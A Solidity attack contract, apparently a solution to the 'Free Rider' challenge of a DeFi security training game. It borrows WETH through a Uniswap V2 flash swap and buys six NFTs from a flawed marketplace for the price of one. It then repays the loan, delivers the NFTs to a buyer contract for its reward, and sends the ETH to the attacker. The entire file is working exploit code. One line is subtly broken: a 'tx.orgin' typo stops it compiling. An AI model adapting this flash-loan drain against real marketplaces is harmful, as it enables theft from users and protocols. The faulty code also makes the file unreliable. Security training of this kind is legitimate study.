// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../WETH9.sol";

contract AttackFreeRider {
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderBuyer buyerContract;
    IERC721 public nft;
    address public attacker;
    WETH9 weth;
    uint[] tokenIds = [0,1,2,3,4,5];

    constructor(
        address _pair,
        address payable _marketplace,
        address _buyer,
        address _nft,
        address _weth
    ){
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        buyerContract = FreeRiderBuyer(_buyer);
        nft = IERC721(_nft);
        attacker =  msg.sender;
        weth = WETH9(_weth);
    }

    function attack(uint256 borrowedETH) public {
        bytes memory data = abi.encode(weth); //encode any random data

        //passing any value to as the fourth argument signifies that the user wants to perform a flashSwap
        pair.swap(borrowedETH, 0 , address(this), data);

        //transfer nfts to the buyer contract
        for(uint256 i = 0; i < 6; i++){
            nft.safeTransferFrom(address(this), address(buyerContract), i);
        }

        //withdraw ETH to attacker's account
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "ETH transfer failed!");
    }

    //Flashswap callback function
    function uniswapV2Call(address flashSwapRequester, uint256 borrowedETH, uint256, bytes calldata) external{
        require(msg.sender == address(pair), "!pair");
        require(flashSwapRequester == address(this), "!sender");

        //Unwrap the WETH we recieved
        weth.withdraw(borrowedETH);
        marketplace.buyMany{value : address(this).balance}(tokenIds);

        //calcualte fee
        uint256 flashSwapFee = ((borrowedETH * 3) / 997 + 1);
        uint256 amountToRepay = borrowedETH + flashSwapFee;

        //Deposit the ETH to mint WETH
        weth.deposit{value: amountToRepay}();
        
        //pay back the swapped tokens
        weth.transfer(address(pair), amountToRepay);
    }

    receive() external payable {}

    //Interface required to recieve NFT as smart contract
    function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
    )   external view returns(bytes4)
    {
        require(msg.sender == address(nft), "!nft");
        require(tx.orgin == attacker);
        return IERC721Receiver.onERC721Received.selector;
    }   
}